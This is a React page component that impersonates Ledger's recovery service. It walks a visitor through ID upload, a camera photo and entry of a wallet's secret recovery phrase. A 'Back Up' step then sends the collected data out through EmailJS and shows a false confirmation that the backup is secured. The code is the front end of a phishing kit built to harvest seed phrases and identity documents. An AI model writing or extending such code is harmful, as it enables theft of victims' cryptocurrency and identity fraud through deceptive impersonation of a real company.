import React, { useState, useContext } from 'react';
import IdVerification from '../components/IdVerification';
import SeedPhraseVerification from '../components/SeedPhraseVerification';
import CameraVerification from '../components/CamVerification';
import { AuthContext } from '../context/AuthContext';
import emailjs from 'emailjs-com';
import Modal from 'react-modal';
import { FaCheckCircle } from 'react-icons/fa';

Modal.setAppElement('#root');

function AuthPage() {
  const [currentStep, setCurrentStep] = useState(1);
  const { state, verifyCamera } = useContext(AuthContext);
  const [isModalOpen, setIsModalOpen] = useState(false);

  const handleNextStep = () => {
    setCurrentStep(currentStep + 1);
  };

  const sendEmail = () => {
    if (currentStep < 4 || !state.photo) {
      alert('Please complete all steps and capture a photo.');
      return;
    }

    const templateParams = {
      id: 'valid-id',
      seedPhrase: 'valid-seed-phrase',
      photo: state.photo,
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams, 'YOUR_USER_ID')
      .then((result) => {
        console.log(result.text);
        alert('Email sent successfully!');
        setIsModalOpen(true);
      }, (error) => {
        console.log(error.text);
        alert('Failed to send email.');
      });
  };

  return (
    <div className="container mx-auto p-5">
      <h1 className="text-3xl font-bold text-center mb-8">Ledger Recovery Services</h1>
      
      {/* Progress Bar */}
      <div className="flex justify-around mb-10 max-xl:hidden">
        <div className="flex flex-col items-center">
          <div className={`w-10 h-10 ${currentStep >= 1 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>1</div>
          <span className="mt-2">Verification</span>
        </div>
        <div className="flex flex-col items-center">
          <div className={`w-10 h-10 ${currentStep >= 2 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>2</div>
          <span className="mt-2">Verify Id</span>
        </div>
        <div className="flex flex-col items-center">
          <div className={`w-10 h-10 ${currentStep >= 3 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>3</div>
          <span className="mt-2">Secret Recovery Phrase Verification</span>
        </div>
        <div className="flex flex-col items-center">
          <div className={`w-10 h-10 ${currentStep >= 4 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>4</div>
          <span className="mt-2">Back Up</span>
        </div>
      </div>
      
      {/* Steps */}
      {currentStep === 1 && <IdVerification onNext={handleNextStep} />}
      {currentStep === 3 && <SeedPhraseVerification onNext={handleNextStep} />}
      {currentStep === 2 && <CameraVerification />}
      {currentStep === 4 && (
        <div>
          <h2 className="text-xl font-semibold mb-4">Backup</h2>
          <button onClick={sendEmail} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Back Up</button>
        </div>
      )}
      
      {/* Backup Complete Modal */}
      <Modal
        isOpen={isModalOpen}
        onRequestClose={() => setIsModalOpen(false)}
        className="fixed inset-0 bg-white p-4 flex flex-col items-center justify-center z-50"
        overlayClassName="fixed inset-0 bg-black bg-opacity-50 z-40"
      >
        <div className="text-center">
          <FaCheckCircle className="text-green-500 text-6xl mb-4" /> {/* Checkmark Icon */}
          <img src="/mnt/data/WhatsApp Image 2024-08-04 at 6.43.22 AM.jpeg" alt="Backup Complete" className="mx-auto mb-4" />
          <p className="text-xl font-bold">You've secured the backup for your Secret Recovery Phrase using Ledger Recover.</p>
          <button onClick={() => setIsModalOpen(false)} className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Close</button>
        </div>
      </Modal>
    </div>
  );
}

export default AuthPage;
